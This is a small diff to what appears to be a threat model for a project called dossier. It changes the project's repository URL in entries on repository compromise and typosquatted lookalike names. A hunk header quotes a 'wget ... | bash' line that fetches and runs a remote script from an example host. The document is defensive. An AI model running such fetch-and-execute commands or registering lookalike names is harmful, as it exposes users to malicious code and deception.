@@ -208,7 +208,7 @@ User → [MITM Proxy] → GitHub
 
 ### T5: Supply Chain - Repository Compromise
 
-**Attack**: Attacker gains write access to github.com/imboard-ai/dossier
+**Attack**: Attacker gains write access to github.com/imboard-ai/ai-dossier
 
 1. Compromise GitHub account
 2. Push malicious dossier to main branch
@@ -350,7 +350,7 @@ wget https://scripts.example.com/setup.sh | bash
 **Attack**: Register similar dossier name to confuse users
 
 ```
-Legitimate: github.com/imboard-ai/dossier
+Legitimate: github.com/imboard-ai/ai-dossier
 Malicious:  github.com/imboard-ai-official/dossier  # Note the extra "-official"
             github.com/imb0ard-ai/dossier            # Zero instead of 'o'
 ```
